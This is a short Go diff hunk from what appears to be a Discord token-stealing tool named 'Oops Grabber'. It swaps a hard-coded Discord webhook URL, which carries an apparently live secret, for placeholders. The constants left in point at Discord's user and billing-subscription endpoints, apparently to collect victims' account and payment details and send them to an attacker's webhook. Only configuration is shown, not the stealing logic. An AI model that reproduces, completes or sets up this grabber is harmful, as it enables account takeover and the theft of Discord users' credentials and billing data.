@@ -16,9 +16,9 @@ import (
 )
 
 const (
-	WebhookUrl       = "https://discord.com/api/webhooks/923311639888007218/TuhSje8RayyQuPKQ3jmJk_TmmeNlXBdXUP1wjn2Rd_xTwbrXwyktq6PxcTiL3yXui556"
-	WebhookAvatarUrl = "https://i.imgur.com/Q8uuwN4.png"
-	WebhookUsername  = "Oops Grabber"
+	WebhookUrl       = "YOUR_WEBHOOK_URL"
+	WebhookAvatarUrl = "YOUR_WEBHOOK_IMG"
+	WebhookUsername  = "YOUR_WEBHOOK_NAME"
 	DiscordApiUsers  = "https://discordapp.com/api/v6/users/@me"
 	DiscordApiNitro  = "https://discord.com/api/v8/users/@me/billing/subscriptions"
 	DiscordImgUrl    = "https://cdn.discordapp.com/avatars/"
